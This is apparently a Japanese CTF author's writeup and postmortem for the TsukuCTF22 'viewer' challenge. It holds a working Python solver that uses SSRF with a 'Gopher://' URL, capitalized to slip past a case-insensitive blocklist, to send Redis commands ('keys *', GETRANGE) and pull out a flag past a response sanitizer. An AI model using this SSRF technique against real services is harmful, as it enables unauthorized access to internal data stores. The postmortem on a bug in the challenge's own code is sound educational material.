<span>session_id_list </span><span class="token token" style="color:#67cdcc">=</span><span> re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;(.+-.+-.+-.+-.+)\r&quot;</span><span class="token token" style="color:#ccc">,</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#999"># print(session_id_list)</span><span>
</span>
<span></span><span class="token token" style="color:#999"># check redis value</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> session_id </span><span class="token token" style="color:#cc99cd">in</span><span> session_id_list</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    form</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;Gopher://redis:6379/+&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> quote</span><span class="token token" style="color:#ccc">(</span><span class="token token string-interpolation" style="color:#7ec699">f&quot;GETRANGE </span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">session_id</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699"> 60 -1\r\nQUIT\r\n&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    cookies</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;__SESSION_ID&quot;</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> session_id
</span><span>    res </span><span class="token token" style="color:#67cdcc">=</span><span> requests</span><span class="token token" style="color:#ccc">.</span><span>post</span><span class="token token" style="color:#ccc">(</span><span>TARGET_URL</span><span class="token token" style="color:#ccc">,</span><span> data</span><span class="token token" style="color:#67cdcc">=</span><span>form</span><span class="token token" style="color:#ccc">,</span><span> cookies</span><span class="token token" style="color:#67cdcc">=</span><span>cookies</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span> </span><span class="token token" style="color:#cc99cd">in</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">print</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">[</span><span>res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">.</span><span>find</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#cc99cd">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">.</span><span>find</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;}&amp;#34;&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#7ec699">&quot;}&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        sys</span><span class="token token" style="color:#ccc">.</span><span>exit</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span></code></div></pre>
<p>上記のソルバを実行すると、以下の Flag が得られる。</p>
<pre><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">TsukuCTF22{ur1_scheme_1s_u5efu1}
</code></pre>
<h2>ポストモーテム</h2>
<h3>何が起こったか</h3>
<p>前提として、実装コードに不備があったために、問題にアクセスする時に Cookie に格納される <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">__SESSION_ID</code> が共有されているという問題がありました。</p>
<p>本来であればこの問題により Flag が取得できないはずです。しかし、配布されたコードと本番環境のコードの Flag を Redis に追加する部分に差異があったために、配布されたコードで構築できる環境によっては Flag が取得できないにも拘らず、本番環境では Flag が取得できるという現象が起きました。</p>
<p>実際に本番中はソルバによって Flag が取得できることのみを確認していたため、この問題に気づけませんでした。</p>
<h3>技術的詳細</h3>
<p>コードを用いて具体的に説明します。</p>
<p>まず、以下が配布されたコードで Flag を Redis に追加する部分のコードです。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># initialization</span><span>
</span><span>redis </span><span class="token token" style="color:#67cdcc">=</span><span> redis</span><span class="token token" style="color:#ccc">.</span><span>Redis</span><span class="token token" style="color:#ccc">(</span><span>host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&#x27;redis&#x27;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">6379</span><span class="token token" style="color:#ccc">,</span><span> db</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>flag </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{dummy flag}&quot;</span><span> </span><span class="token token" style="color:#999"># the flag is replaced a real flag in a production environment.</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> flag</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>これにより、UUIDv4 を ID とした Flag を含むデータが Redis に登録されます。</p>
<p>しかし、アカウント登録の部分にて以下の通りその ID に対して上書きが行われます。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> name</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span>expire</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>その結果、Redis に登録された Flag が名前で上書きされてしまいます。</p>
<p>詳しくは<a href="https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved">mopi さんのブログ</a>にて検証されているためご覧ください。検証までブログに掲載してくださった mopi さん、ありがとうございました :pray:</p>
<hr/>
<p>一方、以下が本番環境のコードで Flag を Redis に追加する部分のコードです。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># user session information</span><span>
</span><span>redis </span><span class="token token" style="color:#67cdcc">=</span><span> redis</span><span class="token token" style="color:#ccc">.</span><span>Redis</span><span class="token token" style="color:#ccc">(</span><span>host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&#x27;redis&#x27;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">6379</span><span class="token token" style="color:#ccc">,</span><span> db</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>users </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&#x27;frt&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;ny_a&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;satoki&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;shio&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;taisyo&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;task&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{ur1_scheme_1s_u5efu1}&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;toto&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;xryuseix&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;y-chan&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;yu1k&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;yoshimi&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;ling&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;momoka&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;taru&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;imino&#x27;</span><span class="token token" style="color:#ccc">]</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> user </span><span class="token token" style="color:#cc99cd">in</span><span> users</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> user</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">id</code> はループでイテレートされているため、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">id</code>が変更されるのは最後のユーザのみになります。そのため、本番環境では Flag の上書きが発生しませんでした。</p>
<h3>根本原因</h3>
<p><strong>根本原因はユーザ登録を行う id 用の UUIDv4 を再生成していなかったこと</strong> にあります。その影響で、配布されたコードで構築される環境では、Redis に追加された Flag が上書きされてしまい取得することが不可能になります。</p>
<p>しかし、上記の通り、<strong>本番環境では Redis にダミーデータを含めて Flag を挿入していたために、Flag が上書きされずに取得できていました</strong>。この差異は作問時から含まれていましたが、作問時には作問方針と解法の流れのみがレビューされていたために、この問題に気づけませんでした。</p>
<p>また、本番中は約 1 時間ごとに 1 回ソルバを回して Flag が得られることのみを確認していたために、配布ファイルには気を配れていませんでした。</p>
<h3>解決</h3>
<p>以下の通り <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">id</code> を生成してから登録することで、正しい実装になります。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>    </span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> name</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span>expire</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<h3>影響</h3>
<p>影響を受けたユーザは全ユーザです。一応、本件に関して言及してくださったブログやツイートを載せておきます。</p>
<ul>
<li><a href="https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved">TsukuCTF 2022 Writeup</a></li>
<li><a href="https://twitter.com/zeosutt/status/1584214650853683200">ツイート 1</a></li>
<li><a href="https://twitter.com/shinobe179/status/1584574685718585344">ツイート 2</a></li>
</ul>
<h3>対応者</h3>
<p>問題が発覚したのは CTF 終了後だったため、本番中の対応者はいません。</p>
<h3>追記</h3>
<p>実装に関して、他にも修正すべき点がいくつかあったので以下に記載しておきます。</p>
<p><strong>Exception が起きた時に PycURL のコネクションが close されない</strong></p>
<p>配布ファイルは以下のようになっており、PycURL で <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">c.perform()</code> 実行時に Exception が発生した場合は <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">c.close()</code> が呼ばれません。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>        buf </span><span class="token token" style="color:#67cdcc">=</span><span> BytesIO</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c </span><span class="token token" style="color:#67cdcc">=</span><span> pycurl</span><span class="token token" style="color:#ccc">.</span><span>Curl</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>URL</span><span class="token token" style="color:#ccc">,</span><span> url</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>WRITEDATA</span><span class="token token" style="color:#ccc">,</span><span> buf</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>perform</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>            body </span><span class="token token" style="color:#67cdcc">=</span><span> buf</span><span class="token token" style="color:#ccc">.</span><span>getvalue</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>decode</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&#x27;utf-8&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            traceback</span><span class="token token" style="color:#ccc">.</span><span>print_exc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            abort</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;error occurs&quot;</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>したがって、以下の通り <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">finally</code> 句を利用するべきです。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>        buf </span><span class="token token" style="color:#67cdcc">=</span><span> BytesIO</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        c </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">None</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c </span><span class="token token" style="color:#67cdcc">=</span><span> pycurl</span><span class="token token" style="color:#ccc">.</span><span>Curl</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>URL</span><span class="token token" style="color:#ccc">,</span><span> url</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>WRITEDATA</span><span class="token token" style="color:#ccc">,</span><span> buf</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>perform</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>            body </span><span class="token token" style="color:#67cdcc">=</span><span> buf</span><span class="token token" style="color:#ccc">.</span><span>getvalue</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>decode</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&#x27;utf-8&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            traceback</span><span class="token token" style="color:#ccc">.</span><span>print_exc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            abort</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;error occurs&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">finally</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p><strong>PycURL のタイムアウトが設けられていない</strong></p>
<p>PycURL はデフォルトで 300[s]のコネクションタイムアウトを持っていますが、今回のアプリケーションの要件には長すぎです。今回の問題では得られた Redis の key に対して全探索を行う必要があり、コネクションが集中することは容易に想定できるため、タイムアウトは 10[s]くらいに設定しておいても良かったのではないかと思いました。</p>
<h3>おわりに</h3>
<p>この度は、作問者の実装不備によって、参加者体験を悪くしてしまったことを深くお詫び申し上げます。
今後はレビュー時に解法の方針やフラグチェック用のソルバだけでなく、配布ファイルにも気を配ってレビューする予定です。</p>
<p>また、他の参加者も含めたより良い CTF 体験のために、Discord での#ask-to-admin にてお問い合わせいただくなどのご協力をお願いいたします。</p>
<h2>参考資料</h2>
<ul>
<li><a href="https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/">ポストモーテムテンプレート - PagerDuty</a></li>
</ul></div><div class="Footer_footer__RDRE2">© 2021-<!-- -->2023<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"id":"viewer","contentHtml":"# viewer\n\n## はじめに\n\n本問題で配布されたコードの一部に実装不備があり参加者体験を悪くしてしまったことを、CTF 終了後に幾つかのブログ記事やツイートから知りました。この件に関して、万全の問題提供ができなかったことをお詫び申し上げます。\n\n再発防止のために配布されるコードと本番環境のコードに差異を生まないようレビュー段階で注意する予定です。そして、参加者の皆様にとってより良い CTF にするためにも、不審な点などがあれば Discord の#ask-to-admin でご確認いただけると非常にありがたいです。よろしくお願いします。\n\nまた、これに伴い簡単なポストモーテムを行ったため Writeup 末尾に追記します。本件に興味がある方はご覧ください。\n\n## 問題文\n\nWriteups for TsukuCTF21 have been published.\nCheck them out if you'd like!\n\n## 難易度\n\nMedium\n\n## 解法\n\n配布されているソースコードを読むと、redis の中に FLAG が含まれていることが分かる。\\\ncurl で redis ということは別プロトコルを利用した SSRF が思い浮かぶ。\\\nFlag が存在している場所は`app.py` 上か redis 内部であるため、いずれかの情報を抜き取りたい。\\\n前者は `file://` scheme、後者は `gopher://` や`dict://` scheme を利用することになりそうだ。\n\nしかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。\n\n```python\n# app.py\n# a response is also sanitized just in case because the flag is super sensitive information.\nblacklist_in_response = ['TsukuCTF22']\n\ndef response_sanitizer(body: str) -\u003e str:\n    if any([scheme in body for scheme in blacklist_in_response]):\n        return \"SANITIZED: a sensitive data is included!\"\n    return body\n```\n\n`gopher://` 等は禁止されているように見えるが、case-insensitive なので大文字を含めることで回避できる。\n\nただし、gopher で対象の value を取るために、redis の key を知る必要がある。\\\nkey は redis の `keys *` で全列挙できるため、全ての key を列挙して response に flag が含まれるものを選択すれば良い。\n\nまた、`TsukuCTF22`という文字列を含む場合は sanitize されるが、`GETRANGE` で一部を抜き出すことで対処できる。\\\nしたがって、方針は以下の通りになる。\\\nまず、redis に含まれる key を全列挙し、次に GETRANGE で列挙したものの一部を読み取る。\n\nsolver は以下の通り。\n\n```python\nimport requests\nfrom urllib.parse import quote\nimport re\nimport sys\n\n# CHANGE HERE with an appropriate url\nTARGET_URL = \"http://127.0.0.1:31555\"\n\n# enumerate redis keys\nform = {\n    \"url\": \"Gopher://redis:6379/+\" + quote(\"keys *\\r\\nQUIT\\r\\n\")\n}\ncookies = {\n    \"__SESSION_ID\": \"d8c7d141-b8da-416b-a220-d8d7218c8bbc\", # dummy session 